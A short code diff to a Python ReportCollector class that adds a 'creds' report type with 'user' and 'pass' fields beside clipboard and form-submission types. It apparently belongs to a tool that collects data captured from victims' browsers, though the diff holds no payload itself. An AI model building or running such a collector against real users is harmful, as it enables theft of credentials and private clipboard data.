@@ -69,6 +69,8 @@ class ReportCollector:
             report_data_keys = ["act", "meth", "data"]
         elif report_data_type == "clipboard":
             report_data_keys = ["type", "data"]
+        elif report_data_type == "creds":
+            report_data_keys = ["user", "pass"]
         else:
             raise Exception("Invalid report data type: %s" % report_data_type)
 
